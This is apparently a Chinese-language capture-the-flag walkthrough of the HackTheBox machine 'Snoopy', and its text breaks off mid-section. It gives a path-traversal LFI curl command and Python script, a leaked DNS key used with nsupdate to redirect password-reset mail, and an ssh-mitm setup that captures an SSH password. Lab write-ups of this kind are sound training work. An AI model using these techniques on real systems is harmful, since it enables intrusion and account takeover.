---
title: Snoopy - HackTheBox
url: https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/
source: 喵喵喵喵
date: 2023-05-10
fetch_date: 2025-10-04T11:36:43.330432
---

# Snoopy - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Snoopy - HackTheBox

# Snoopy - HackTheBox

##### 2023-05-09

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
   2. [2.2. mail](#mail)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. mm.snoopy.htb](#mm-snoopy-htb)
4. [4. LFI](#LFI)
   1. [4.1. named.conf](#named-conf)
   2. [4.2. lfi.py](#lfi-py)
5. [5. DNS to mm](#DNS-to-mm)
6. [6. mm](#mm)
   1. [6.1. server\_provision](#server-provision)
   2. [6.2. ssh-mitm](#ssh-mitm)
7. [7. cbrown](#cbrown)
   1. [7.1. git apply](#git-apply)
   2. [7.2. /tmp/diff](#tmp-diff)
8. [8. user flag](#user-flag)
   1. [8.1. 提权信息](#提权信息)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
   2. [9.2. root\_id\_rsa](#root-id-rsa)
10. [10. 参考资料](#参考资料)

# Snoopy - HackTheBox

2023-05-09

# 基本信息

* <https://app.hackthebox.com/machines/Snoopy>
* 10.10.11.212

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg)

# 端口扫描

22，53，80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.212 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:06 CST Nmap scan report for 10.10.11.212 Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA) |_  256 545941e1719a1a879c1e995059bfe5ba (ED25519) 53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) | dns-nsid: |_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-title: SnoopySec Bootstrap Template - Index |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds ``` |

## 80

链接里得到域名，加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.212 snoopy.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg)

## mail

contact里提到mail暂时离线：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg)

# 子域名扫描

子域名发现mm:

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://snoopy.htb/" -H 'Host: FUZZ.snoopy.htb' -fs 23418  [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 200ms]     * FUZZ: mm ``` |

## mm.snoopy.htb

添加hosts后访问，是一个Mattermost：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050803.jpg)

但没开外部注册

# LFI

回到主站，存在一个下载功能，简单测试发现存在LFI，基础双写绕过，下载下来是一个压缩包，解压得到读取内容：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` file_path="/etc/passwd" curl "http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//..../$file_path" -o output.zip  unzip output.zip cat press_package/$file_path ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050804.jpg)

后面就是一步步读文件,例如前面端口和主站都有提到dns，就可以读dns配置文件：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` /etc/bind/named.conf ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050805.jpg)

## named.conf

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ``` | ``` // This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local  include "/etc/bind/named.conf.options"; include "/etc/bind/named.conf.local"; include "/etc/bind/named.conf.default-zones";  key "rndc-key" {     algorithm hmac-sha256;     secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="; }; ``` |

## lfi.py

使用脚本完成自动解压，交互式读文件：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ``` | ``` import requests from colorama import Fore, Style import zipfile   def lfi(path):     try:         #cookies               url ="http://snoopy.htb/download"         params = {"file":f"....//....//....//....//....//....//....//....//....//....//....//..../{path}"}         r= requests.get(url,params=params)         if(r.status_code == 200):             with open('ejemplo.zip', 'wb') as f:                 f.write(r.content)                          with zipfile.ZipFile('ejemplo.zip', 'r') as zip_ref:                 zip_ref.extractall('.')                          with open(f'press_package{path}', 'r') as f:                 content = f.read()                 print(Fore.GREEN + f"{content}" + Style.RESET_ALL)           else:             print(Fore.RED + f"{path} not found." + Style.RESET_ALL)                  except zipfile.BadZipFile:         print(Fore.RED + f"{path} not found." + Style.RESET_ALL)     except Exception as e:         print(Fore.RED + f"LFI Error : {e}" + Style.RESET_ALL)   def main():     while True:         path  = input(Fore.BLUE + "[+] file >> " + Style.RESET_ALL)         lfi(path)  if __name__ == "__main__":     main() ``` |

# DNS to mm

前面知道mail离线，mm没开注册，找回密码提示发邮件应该是通过mail，那就尝试通过获得的secret添加dns记录：

* DNS Updates with nsupdate - Serverless Industries
  <https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` # 本地开启smtp监听，用于后面接收邮件内容 sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.13:25  export HMAC="hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=" nsupdate -y $HMAC  server 10.10.11.212 update add mail.snoopy.htb.   900  IN  A 10.10.14.13 send ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050807.jpg)

然后去mm那里忘记密码发送找回邮件：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` sbrown@snoopy.htb  # 小坑，删除URL里的3D和= Reset Password http://mm.snoopy.htb/reset_password_complete?token=4f5x4ogxb7q1pgccrzh717kzkuyg9cq4ngt9z1xba4uuxze9tjo77spoyi5fzgya ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050808.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050809.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050810.jpg)

重置成功，登录mm：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050811.jpg)

# mm

mm里提供一些额外命令

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050812.jpg)

## server\_provision

看起来是操作服务器的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050813.jpg)

输入参数测试，有连接过来,根据banner知道用的是Paramiko进行的ssh连接：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050814.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050815.jpg)

## ssh-mitm

因为直接nc没法完成模拟完整的ssh交互，所以使用这个：

* SSH-MITM - ssh audits made simple — SSH-MITM
  <https://docs.ssh-mitm.at/>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` python3 -m pip install ssh-mitm  cbrown@snoopy.htb  python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222 ``` |

remote设置成靶机ip，让mm那里连到我们的2222端口再转发到靶机的22端口，得到cbrown ssh账号密码：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050816.jpg)

# cbrown

cbrown ssh登录,下一步应该是要通过git到sbrown：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` Remote Address: 10.10.11.212:22 Username: cbrown Password: sn00pedcr3dential!!! Agent: no agent ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/im...